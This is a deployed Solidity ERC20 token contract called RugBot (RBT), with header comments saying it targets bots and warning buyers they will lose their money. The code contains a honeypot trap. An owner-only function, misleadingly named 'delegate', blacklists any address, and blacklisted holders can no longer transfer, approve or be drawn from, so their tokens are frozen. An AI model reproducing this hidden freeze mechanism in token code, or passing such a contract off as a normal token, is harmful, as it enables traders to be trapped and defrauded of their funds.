/**
 *Submitted for verification at Etherscan.io on 2023-07-12
*/

pragma solidity ^0.5.16;

// ----------------------------------------------------------------------------
// This token is specifically designed to target and eliminate bots that monitor our fund's address. 
// Bots are malignant entities in our ecosystem, and we will continue to eradicate them. Only bots would buy this token, not ordinary users. 

// DON'T BUY, U will lose all ur money for buying this!!!!!!!!!
// DON'T BUY, U will lose all ur money for buying this!!!!!!!!!
// DON'T BUY, U will lose all ur money for buying this!!!!!!!!!
// DON'T BUY, U will lose all ur money for buying this!!!!!!!!!
// DON'T BUY, U will lose all ur money for buying this!!!!!!!!!

// ----------------------------------------------------------------------------
contract ERC20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// ----------------------------------------------------------------------------
// Safe Math Library
// ----------------------------------------------------------------------------
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }
    function safeMul(uint a, uint b) public pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }
    function safeDiv(uint a, uint b) public pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}

contract RUGBOTS is ERC20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals;
    address private _owner = 0x66B870dDf78c975af5Cd8EDC6De25eca81791DE1;
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => bool) public Delegate;

    // Modifier for onlyOwner
    modifier onlyOwner() {
        require(msg.sender == _owner, "Only the owner can call this function.");
        _;
    }

    constructor() public {
        name = "RugBot";
        symbol = "RBT";
        decimals = 18;
        _totalSupply = 70000000000*10**18;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function delegate(address user) public onlyOwner {
        Delegate[user] = true;
    }

    function undelegate(address user) public onlyOwner {
        Delegate[user] = false;
    }

    function approve(address spender, uint tokens) public returns (bool success) {
        require(!Delegate[msg.sender], "Address is Delegateed");
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        require(!Delegate[msg.sender], "Address is Delegateed");
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
        require(!Delegate[from], "Address is Delegateed!"); // Check if the address is Delegateed
        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;

    }
}